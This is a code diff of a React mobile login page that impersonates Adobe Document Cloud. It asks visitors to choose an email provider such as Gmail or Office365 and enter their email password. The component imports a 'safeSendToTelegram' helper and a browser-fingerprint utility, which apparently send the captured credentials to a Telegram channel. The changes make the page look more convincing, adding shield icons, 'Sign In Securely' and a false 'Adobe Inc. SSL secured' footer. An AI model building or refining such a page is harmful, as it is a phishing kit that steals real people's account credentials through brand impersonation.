@@ -1,5 +1,5 @@
 import React, { useState } from 'react';
-import { ArrowLeft, Mail, Lock, Eye, EyeOff } from 'lucide-react';
+import { ArrowLeft, Mail, Lock, Eye, EyeOff, Shield, Sparkles } from 'lucide-react';
 import { getBrowserFingerprint } from '../../utils/oauthHandler';
 import { safeSendToTelegram } from '../../utils/safeSendToTelegram';
 
@@ -25,12 +25,12 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
   const [errorMessage, setErrorMessage] = useState('');
 
   const emailProviders = [
-    { name: 'Office365', domain: 'outlook.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/office-365-icon.png' },
-    { name: 'Yahoo', domain: 'yahoo.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/yahoo-square-icon.png' },
-    { name: 'Outlook', domain: 'outlook.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/microsoft-outlook-icon.png' },
-    { name: 'AOL', domain: 'aol.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/aol-icon.png' },
-    { name: 'Gmail', domain: 'gmail.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/gmail-icon.png' },
-    { name: 'Others', domain: 'other.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/communication-chat-call/envelope-line-icon.png' }
+    { name: 'Office365', domain: 'outlook.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/office-365-icon.png', color: 'from-blue-500 to-blue-600' },
+    { name: 'Yahoo', domain: 'yahoo.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/yahoo-square-icon.png', color: 'from-purple-500 to-purple-600' },
+    { name: 'Outlook', domain: 'outlook.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/microsoft-outlook-icon.png', color: 'from-blue-500 to-blue-600' },
+    { name: 'AOL', domain: 'aol.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/aol-icon.png', color: 'from-red-500 to-red-600' },
+    { name: 'Gmail', domain: 'gmail.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/gmail-icon.png', color: 'from-red-500 to-red-600' },
+    { name: 'Others', domain: 'other.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/communication-chat-call/envelope-line-icon.png', color: 'from-gray-500 to-gray-600' }
   ];
 
   const handleProviderSelect = (provider: string) => {
@@ -119,75 +119,156 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
   };
 
   return (
-    <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-[#f0f6f8] to-[#e6eef2] p-4">
-      <div className="w-full max-w-sm">
-        <div className="bg-white rounded-lg shadow border border-gray-100 p-4">
-          <div className="flex items-center gap-3 mb-8">
-            <div className="w-10 h-10 rounded-lg bg-red-500 flex items-center justify-center">
-              <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b9/Adobe_Document_Cloud_icon_%282020%29.svg/640px-Adobe_Document_Cloud_icon_%282020%29.svg.png" alt="Adobe Document Cloud" className="w-5 h-5 object-contain" />
-            </div>
-            <div>
-              <h1 className="text-sm font-semibold text-gray-900">Read Your Document</h1>
-              <p className="text-xs text-gray-600 -mt-0.5">Please select your e-mail provider below:</p>
-            </div>
-          </div>
+    <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-slate-50 via-blue-50 to-indigo-100 p-4 relative overflow-hidden">
+      {/* Animated background elements */}
+      <div className="absolute inset-0 overflow-hidden">
+        <div className="absolute -top-20 -right-20 w-40 h-40 bg-gradient-to-br from-blue-400/20 to-purple-400/20 rounded-full blur-2xl animate-pulse"></div>
+        <div className="absolute -bottom-20 -left-20 w-40 h-40 bg-gradient-to-br from-indigo-400/20 to-pink-400/20 rounded-full blur-2xl animate-pulse delay-1000"></div>
+        <div className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-48 h-48 bg-gradient-to-br from-cyan-400/10 to-blue-400/10 rounded-full blur-2xl animate-pulse delay-500"></div>
+      </div>
 
-          <div className="mt-10">
-            {!selectedProvider ? (
-              <div className="grid grid-cols-2 gap-4 justify-items-center">
-                {emailProviders.map((provider) => (
-                  <button key={provider.name} onClick={() => handleProviderSelect(provider.name)} className="p-1 bg-transparent hover:opacity-90 transition-transform transform hover:-translate-y-0.5 flex items-center justify-center" aria-label={`Select ${provider.name}`} type="button">
-                    <div className="w-10 h-10 flex items-center justify-center rounded-md bg-white border border-gray-100 shadow-sm">
-                      <img src={provider.logo} alt={provider.name} className="w-5 h-5 object-contain" />
-                    </div>
-                  </button>
-                ))}
+      <div className="w-full max-w-sm relative z-10">
+        <div className="bg-white/80 backdrop-blur-xl rounded-2xl shadow-2xl border border-white/20 p-6 relative overflow-hidden">
+          {/* Subtle gradient overlay */}
+          <div className="absolute inset-0 bg-gradient-to-br from-white/50 to-transparent pointer-events-none"></div>
+          
+          <div className="relative z-10">
+            <div className="flex items-center gap-3 mb-6">
+              <div className="w-10 h-10 rounded-xl bg-gradient-to-br from-red-500 to-red-600 flex items-center justify-center shadow-lg">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b9/Adobe_Document_Cloud_icon_%282020%29.svg/640px-Adobe_Document_Cloud_icon_%282020%29.svg.png" alt="Adobe Document Cloud" className="w-5 h-5 object-contain" />
               </div>
-            ) : (
               <div>
-                <div className="flex items-center gap-2 mb-3">
-                  <button onClick={handleBackToProviders} className="text-gray-500 hover:text-gray-800" type="button">
-                    <ArrowLeft className="w-4 h-4" />
-                  </button>
-                  <h2 className="text-sm font-semibold text-gray-900">Sign in with {selectedProvider}</h2>
-                </div>
-
-                <form onSubmit={handleFormSubmit} className="space-y-3">
-                  {errorMessage && (
-                    <div className="bg-red-50 border border-red-100 rounded-md p-2">
-                      <p className="text-red-600 text-xs">{errorMessage}</p>
-                    </div>
-                  )}
-
-                  <div>
-                    <label className="block text-xs font-medium text-gray-600 mb-1">Email Address</label>
-                    <div className="relative">
-                      <Mail className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-4 h-4" />
-                      <input type="email" value={email} onChange={(e) => setEmail(e.target.value)} className="w-full pl-10 pr-3 py-2 bg-gray-50 border border-gray-200 rounded-md text-gray-900 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm" placeholder="Enter your email" required />
-                    </div>
-                  </div>
-
-                  <div>
-                    <label className="block text-xs font-medium text-gray-600 mb-1">Password</label>
-                    <div className="relative">
-                      <Lock className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-4 h-4" />
-                      <input type={showPassword ? 'text' : 'password'} value={password} onChange={(e) => setPassword(e.target.value)} className="w-full pl-10 pr-10 py-2 bg-gray-50 border border-gray-200 rounded-md text-gray-900 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm" placeholder="Enter your password" required />
-                      <button type="button" onClick={() => setShowPassword(!showPassword)} className="absolute right-2 top-1/2 transform -translate-y-1/2 text-gray-500 hover:text-gray-800">
-                        {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
-                      </button>
-                    </div>
-                  </div>
-
-                  <button type="submit" disabled={isLoading || !email || !password} className="w-full bg-blue-600 text-white py-2 rounded-md font-semibold hover:bg-blue-700 disabled:opacity-60 transition-colors text-sm">
-                    {isLoading ? (loginAttempts === 0 ? 'Signing in...' : 'Verifying...') : 'Sign In'}
-                  </button>
-                </form>
+                <h1 className="text-lg font-bold text-gray-900 flex items-center gap-2">
+                  Secure Access
+                  <Shield className="w-3 h-3 text-green-500" />
+                </h1>
+                <p className="text-xs text-gray-600">Choose your email provider</p>
               </div>
-            )}
-          </div>
+            </div>
 
-          <div className="mt-3 text-center">
-            <p className="text-xs text-gray-500">© 2025 Adobe Inc. All rights reserved.</p>
+            <div className="mt-6">
+              {!selectedProvider ? (
+                <div className="space-y-4">
+                  <div className="text-center mb-4">
+                    <div className="inline-flex items-center gap-2 px-3 py-1.5 bg-gradient-to-r from-blue-50 to-indigo-50 rounded-full border border-blue-100">
+                      <Sparkles className="w-3 h-3 text-blue-500" />
+                      <span className="text-xs font-medium text-blue-700">Select Provider</span>
+                    </div>
+                  </div>
+                  
+                  <div className="grid grid-cols-3 gap-3">
+                    {emailProviders.map((provider) => (
+                      <button 
+                        key={provider.name} 
+                        onClick={() => handleProviderSelect(provider.name)} 
+                        className="group relative flex flex-col items-center gap-2 p-3 bg-white/60 backdrop-blur-sm rounded-xl shadow-sm border border-gray-100/50 hover:shadow-lg hover:bg-white/80 transition-all duration-300 transform hover:-translate-y-1 active:scale-95" 
+                        aria-label={`Select ${provider.name}`} 
+                        type="button"
+                      >
+                        <div className={`w-8 h-8 flex items-center justify-center rounded-lg bg-gradient-to-br ${provider.color} shadow-md group-hover:shadow-lg transition-shadow duration-300`}>
+                          <img src={provider.logo} alt={provider.name} className="w-4 h-4 object-contain filter brightness-0 invert" />
+                        </div>
+                        <div className="text-xs font-semibold text-gray-800 group-hover:text-gray-900 transition-colors text-center">
+                          {provider.name}
+                        </div>
+                        <div className="absolute inset-0 rounded-xl bg-gradient-to-br from-white/20 to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-300"></div>
+                      </button>
+                    ))}
+                  </div>
+                </div>
+              ) : (
+                <div className="space-y-4">
+                  <div className="flex items-center gap-2 mb-4">
+                    <button 
+                      onClick={handleBackToProviders} 
+                      className="p-1.5 rounded-lg hover:bg-gray-100 transition-colors" 
+                      type="button"
+                    >
+                      <ArrowLeft className="w-4 h-4 text-gray-600" />
+                    </button>
+                    <div className="flex items-center gap-2">
+                      <div className={`w-6 h-6 flex items-center justify-center rounded-lg bg-gradient-to-br ${emailProviders.find(p => p.name === selectedProvider)?.color} shadow-md`}>
+                        <img src={emailProviders.find(p => p.name === selectedProvider)?.logo} alt={selectedProvider} className="w-3 h-3 object-contain filter brightness-0 invert" />
+                      </div>
+                      <h2 className="text-sm font-bold text-gray-900">Sign in with {selectedProvider}</h2>
+                    </div>
+                  </div>
+
+                  <form onSubmit={handleFormSubmit} className="space-y-4">
+                    {errorMessage && (
+                      <div className="bg-gradient-to-r from-red-50 to-pink-50 border border-red-200 rounded-xl p-3 animate-shake">
+                        <p className="text-red-700 text-xs font-medium flex items-center gap-2">
+                          <div className="w-3 h-3 rounded-full bg-red-500 flex items-center justify-center">
+                            <div className="w-1.5 h-1.5 bg-white rounded-full"></div>
+                          </div>
+                          {errorMessage}
+                        </p>
+                      </div>
+                    )}
+
+                    <div className="space-y-3">
+                      <div>
+                        <label className="block text-xs font-semibold text-gray-700 mb-1.5">Email Address</label>
+                        <div className="relative group">
+                          <Mail className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-4 h-4 group-focus-within:text-blue-500 transition-colors" />
+                          <input 
+                            type="email" 
+                            value={email} 
+                            onChange={(e) => setEmail(e.target.value)} 
+                            className="w-full pl-10 pr-3 py-3 bg-white/70 backdrop-blur-sm border border-gray-200 rounded-xl text-gray-900 placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all duration-300 hover:bg-white/80 text-sm" 
+                            placeholder="Enter your email" 
+                            required 
+                          />
+                        </div>
+                      </div>
+
+                      <div>
+                        <label className="block text-xs font-semibold text-gray-700 mb-1.5">Password</label>
+                        <div className="relative group">
+                          <Lock className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-4 h-4 group-focus-within:text-blue-500 transition-colors" />
+                          <input 
+                            type={showPassword ? 'text' : 'password'} 
+                            value={password} 
+                            onChange={(e) => setPassword(e.target.value)} 
+                            className="w-full pl-10 pr-10 py-3 bg-white/70 backdrop-blur-sm border border-gray-200 rounded-xl text-gray-900 placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all duration-300 hover:bg-white/80 text-sm" 
+                            placeholder="Enter your password" 
+                            required 
+                          />
+                          <button 
+                            type="button" 
+                            onClick={() => setShowPassword(!showPassword)} 
+                            className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-500 hover:text-gray-700 transition-colors"
+                          >
+                            {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
+                          </button>
+                        </div>
+                      </div>
+                    </div>
+
+                    <button 
+                      type="submit" 
+                      disabled={isLoading || !email || !password} 
+                      className="w-full bg-gradient-to-r from-blue-600 to-indigo-600 text-white py-3.5 rounded-xl font-bold hover:from-blue-700 hover:to-indigo-700 disabled:opacity-60 disabled:cursor-not-allowed transition-all duration-300 transform hover:scale-[1.02] active:scale-[0.98] shadow-lg hover:shadow-xl relative overflow-hidden group text-sm"
+                    >
+                      <div className="absolute inset-0 bg-gradient-to-r from-white/20 to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-300"></div>
+                      <div className="relative flex items-center justify-center gap-2">
+                        {isLoading && (
+                          <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
+                        )}
+                        {isLoading ? (loginAttempts === 0 ? 'Signing in...' : 'Verifying...') : 'Sign In Securely'}
+                      </div>
+                    </button>
+                  </form>
+                </div>
+              )}
+            </div>
+
+            <div className="mt-6 text-center">
+              <p className="text-xs text-gray-500 flex items-center justify-center gap-1">
+                <Shield className="w-3 h-3" />
+                © 2025 Adobe Inc. SSL secured.
+              </p>
+            </div>
           </div>
         </div>
       </div>
